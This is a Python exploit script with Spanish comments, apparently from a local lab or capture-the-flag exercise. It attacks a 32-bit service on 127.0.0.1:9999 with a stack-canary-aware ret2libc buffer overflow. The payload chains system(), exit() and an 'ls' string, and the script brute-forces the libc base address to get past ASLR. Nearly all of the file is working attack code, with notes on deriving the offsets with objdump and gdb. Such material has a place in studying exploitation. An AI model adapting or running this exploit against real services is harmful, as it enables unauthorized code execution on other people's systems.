#!/usr/bin/env python3
import struct
import socket
from srv_canary import *
HOST = "127.0.0.1"
PORT = 9999
TIMEOUT = 1.5

# offset de system() en la libc (objdump -T /lib32/libc.so.6 | grep system)
system_offset = 0x52220

# offset de exit() en la libc (objdump -T /lib32/libc.so.6 | grep exit)
exit_offset = 0x3ead0

# offset de "ls" en la libc -> addr "ls" - (addr system - system_offset)
# (gdb) p system -> addr system
# (gdb) find 0xf7d7c000, 0xf7f9a000, "ls" ->  addr "ls"
ls_offset = 0x17d37

def create_payload(libc_base, canary, padding):	
	payload  = b"A" * padding
	payload += canary  # Dirección del canario
	payload += b"A" * 12 # Saltea las siguiente 3 direcciones para 32 bits
	payload += struct.pack("<I", libc_base + system_offset)  # Dirección de system()
	payload += struct.pack("<I", libc_base + exit_offset) # arg1 - Dirección de exit()
	payload += struct.pack("<I", libc_base + ls_offset)   # arg2 - Dirección del argumento ("ls")
	return payload
	    
def brute_force_exploit(canary, padding):	
	# Variables de iteracion de fuerza bruta 
	# 0xf7c69 - 0xf7d68 = 0xff = 255 Combinaciones maximas para el brute force
	'''
	initial_addr = 0xf7c69000
	final_addr = 0xf7d68000
	'''
	initial_addr = 0xf7c64000
	final_addr = 0xf7d63000
	
	step = 0x1000
	intento=1
	success = False
	
	print("[*] Iniciando brute-force del system...")
	
	for libc_base in range(initial_addr, final_addr, step): 
		payload = create_payload(libc_base, canary, padding);
		if test_payload(payload):
			success = True
			break
		intento += 1
	
	if success : 
		print(f"[*] Conseguido en el intento #{intento} - Enviando payload con libc {hex(libc_base)}")
	else: 
		print(f"[*] Terminaron de probarse las {intento} posibilidades del brute force")
		
		
if __name__ == "__main__":
	buffer_size = 64
	canary = find_canary(buffer_size)
	brute_force_exploit(canary, buffer_size)
	
	'''
	libc_base = 0xf7c69000
	payload = create_payload(libc_base, canary, buffer_size);
	print(test_payload(payload))
    	'''
